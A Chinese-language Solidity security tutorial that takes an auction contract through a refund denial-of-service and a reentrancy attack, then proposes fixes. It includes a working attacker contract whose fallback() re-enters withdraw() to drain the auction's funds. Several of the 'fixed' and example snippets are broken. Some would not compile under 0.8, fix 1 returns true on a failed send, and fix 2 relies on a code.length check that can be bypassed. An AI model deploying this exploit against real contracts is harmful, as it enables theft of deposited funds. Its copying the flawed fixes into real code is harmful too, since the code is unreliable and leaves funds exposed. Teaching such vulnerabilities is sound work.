
- [**--\> 拍卖合约C：**](#---拍卖合约c)
- [**--\> 情景描述：**](#---情景描述)
- [**--\>问题描述：**](#--问题描述)
  - [【1】合约C主动退款，在 恶意合约B 中 未写  ``fallback()``和``receive()`` 函数](#1合约c主动退款在-恶意合约b-中-未写--fallback和receive-函数)
    - [1、退款交易失败](#1退款交易失败)
    - [2、资金可能被锁定在 C 中](#2资金可能被锁定在-c-中)
    - [3、调用链状态不一致](#3调用链状态不一致)
  - [【2】合约C 被动退款，在 恶意合约B 中**写了** ``fallback()``和``receive()``，但 fallback() 函数中循环访问 合约C 退款函数，产生重入攻击(Re-entrancy Attack)，导致 合约C的钱 都被转走。](#2合约c-被动退款在-恶意合约b-中写了-fallback和receive但-fallback-函数中循环访问-合约c-退款函数产生重入攻击re-entrancy-attack导致-合约c的钱-都被转走)
- [**--\>解决方案：**](#--解决方案)
    - [- 方案1：优化 withdraw 中 转账部分](#--方案1优化-withdraw-中-转账部分)
    - [- 方案2：采用”拉取模式“ （Withdraw）替代”推动模式“（Push）](#--方案2采用拉取模式-withdraw替代推动模式push)


## **--> 拍卖合约C：**  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleAuction {
    address public beneficiary;    // 拍卖受益人
    uint public auctionEnd;        // 结束时间
    address public highestBidder;  // 当前最高出价人
    mapping(address => uint) bids; // 所有竞拍者价格（哈希表）
    address[] bidders;             // 所有竞拍者（用于遍历哈希表的键数组）
    bool ended;                    // 拍卖状态标志（默认 false）

    // 事件定义
    event HighestBidIncreased(address bidder, uint amount);  // 最高出价更新
    event AuctionEnded(address winner, uint amount);         // 拍卖结束

    // 构造函数：初始化拍卖时间和受益人
    constructor(uint _biddingTime, address _beneficiary) {
        beneficiary = _beneficiary; 
        auctionEnd = block.timestamp + _biddingTime;  
    }

    // 拍卖出价函数
    function bid() public payable {
        // 检查拍卖是否未结束
        require(block.timestamp <= auctionEnd, "Auction already ended");
        
        // 检查出价是否高于当前最高价
        require(bids[msg.sender] + msg.value > bids[highestBidder], "Bid not higher than current highest");

        // 如果是新竞拍者，加入竞拍者列表
        if (bids[msg.sender] == 0) {
            bidders.push(msg.sender);
        }

        // 更新最高出价者和出价金额
        highestBidder = msg.sender;
        bids[msg.sender] += msg.value;
        emit HighestBidIncreased(msg.sender, bids[msg.sender]);
    }

    // 拍卖结束函数：分配资金
    function auctionEnd() public {  
        // 检查拍卖是否已结束
        require(block.timestamp >= auctionEnd, "Auction not yet ended");
        // 检查是否已执行过结束逻辑
        require(!ended, "Auction end already called");

        // 将最高出价转给受益人
        beneficiary.transfer(bids[highestBidder]);

        // 向未中标的竞拍者退款
        for (uint i = 0; i < bidders.length; i++) { 
            address bidder = bidders[i];
            if (bidder == highestBidder) continue;  
            bidder.transfer(bids[bidder]);  // 返还未中标者的资金
        }

        // 标记拍卖已结束
        ended = true;
        emit AuctionEnded(highestBidder, bids[highestBidder]);
    }
}
```
- 恶意 合约B，没有fallback()、receive()函数
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleAuction.sol";

contract hackB{
    function hack_bid(address addr) payable public{
        SimpleAuction sa = SimpleAuction(addr);
        sa.bid{value: msg.value}();
    }
}
```
## **--> 情景描述：**

拍卖交易，有**用户A** 通过 **恶意合约B** 访问**拍卖合约C** ， 用户A 未中标，合约C 退款。

## **-->问题描述：**
### 【1】合约C主动退款，在 恶意合约B 中 未写  ``fallback()``和``receive()`` 函数
#### 1、退款交易失败  
- 若 C 使用transfer或send转账（固定 2300 gas）：由于 B 没有receive()/fallback()，转账会消耗完 gas 并触发回滚，整个退款交易失败，A 无法收到退款
- 若 C 使用call转账且未检查返回值：转账失败但 C 可能误认为成功，导致 A 的退款记录被标记为 “已完成”，但实际未收到资金，形成资金丢失

#### 2、资金可能被锁定在 C 中  
若 C 的退款逻辑是 “一旦触发退款，就从用户的竞拍保证金中扣除并转账”，而转账失败后 C 未处理 “转账失败” 的情况（如未将保证金归还给用户 A 的账户），则 A 的资金会被永久锁定在 C 中，既无法完成退款，也无法用于其他操作。

#### 3、调用链状态不一致  
若 B 在调用 C 的退款前已修改自身状态（如标记 “A 已发起退款”），但 C 的转账失败导致整体交易回滚，可能造成 B 的状态与 C 的状态不一致（如 B 认为退款成功，C 认为未成功）。

### 【2】合约C 被动退款，在 恶意合约B 中**写了** ``fallback()``和``receive()``，但 fallback() 函数中循环访问 合约C 退款函数，产生重入攻击(Re-entrancy Attack)，导致 合约C的钱 都被转走。   
示例如下：  
- 拍卖合约 C 中取回出价的函数：
```solidity
// 使用 withdraw 模式
// 由投标者自己取回出价，返回是否成功
function withdraw() public returns(bool){
    //判断拍卖已截止
    require( block.timestamp > auctionEnd);
    // 取回出价最高者不能是竞拍成功者
    require(msg.sender != highestBidder);
    // 当前地址有钱可用
    require(bids[msg.sender] > 0);

    //-----向调用者转账------
    uint amount = bids[msg.sender];
    if(msg.sender.call{value: amount}("")){
        bids[msg.sender] = 0;
        return true;
    }
    return false;
}
```
- 恶意合约 B ：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 引入拍卖合约
import "./SimpleAuctionV2.sol";

contract B {
    uint stack = 0;

    // 调用拍卖合约函数 bid() 参与竞拍
    function hack_bid(address addr) payable public {
        SimpleAuctionV2 sa = SimpleAuctionV2(addr);
        sa.bid{value: msg.value}(); 
    }

    // 调用拍卖合约的 withdraw() 函数取回钱
    function hack_withdraw(address addr) public {
        SimpleAuctionV2(addr).withdraw();
    }

    // 合约C调用fallback()函数，递归调用直到【1】合约C中钱不够了，【2】gas费不够了，【3】调用栈溢出
    fallback() external payable {
        stack += 2;
        // 判断合约C余额足以支持转账、gas费大于6000、栈深度小于500
        if (msg.sender.balance >= msg.value && gasleft() > 6000 && stack < 500) { 
            SimpleAuctionV2(msg.sender).withdraw(); 
        }
    }
}

```
## **-->解决方案：**  
#### - 方案1：优化 withdraw 中 转账部分  
```solidity
// 使用 withdraw 模式
// 由投标者自己取回出价，返回是否成功
function withdraw() public returns(bool){
    //判断拍卖已截止
    require( now > auctionEnd);
    // 取回出价最高者不能是竞拍成功者
    require(msg.sender != highestBidder);
    // 当前地址有钱可用
    require(bids[msg.sender] > 0);

    //-----优化 向调用者转账------
    uint amount = bids[msg.sender];  //获取余额
    bids[msg.sender] = 0;            //提前清零
    if(!msg.sender.send(amount)){    //使用 send() 转账，gas费固定 2300
        bids[msg.sender] = amount;   //不符合条件时恢复余额 
        return true;
    }
    return false;
}
```
#### - 方案2：采用”拉取模式“ （Withdraw）替代”推动模式“（Push） 
- C 合约仅记录用户 A 的可退款金额，不主动向 B 转账；
- 竞拍允许用户账户参与（可选）  
- 退款时只能 用户A **主动**从 合约C 提取资金，绕过合约B   

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// 竞拍合约
contract Auction {
    mapping(address => uint256) public userDeposits; // 记录用户A（EOA）的保证金

    // 退款时强制验证接收地址为EOA（非合约）
    function refundToUser(address payable userA) external {
        uint256 amount = userDeposits[userA];
        require(amount > 0, "No deposit to refund");

        // 关键：验证接收地址是EOA（合约地址的code.length > 0）
        require(userA.code.length == 0, "Refund only to EOA (non-contract)");

        // 检查-生效-交互（重要！！！）
        userDeposits[userA] = 0;
        (bool success, ) = userA.call{value: amount}("");
        require(success, "Refund failed");
    }

    // 接收竞拍保证金（仅允许EOA存入，可选）
    receive() external payable {
        // 确保存款来自EOA（防止合约批量攻击，可选增强）
        require(msg.sender.code.length == 0, "Only EOA can deposit");
        userDeposits[msg.sender] += msg.value;
    }
}
``` 




